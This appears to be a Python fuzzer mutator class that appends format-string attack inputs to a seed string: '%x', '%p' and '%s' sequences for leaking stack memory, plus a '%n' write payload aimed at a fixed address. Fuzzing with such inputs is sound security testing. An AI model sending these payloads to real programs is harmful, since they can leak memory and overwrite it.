from mutators.base_mutator import BaseMutator


class FormatStringMutator(BaseMutator):
    def __init__(self, input_str: str = ""):
        super().__init__(input_str)

    def mutate(self) -> str:
        """
        Can be a generator:
        mutator = Mutator("some_strings")
        for mutated_str in mutator.mutate():
            do_stuff(mutated_str)
        """
        # Format string to find stack offset
        classic_x = self.input_str + ("AAAAAA" + "%x" * 100)
        yield classic_x

        # Format string %p
        classic_p = self.input_str + ("AAAAAA" + "%p" * 100)
        yield classic_p

        # Format string %s
        classic_s = self.input_str + ("AAAAAA" + "%s" * 100)
        yield classic_s

        # Format string %n
        payload = b"\x78\x45\x34\x12%150x%12$hhn"
        classic_n = self.input_str + payload.decode("utf-8")
        yield classic_n
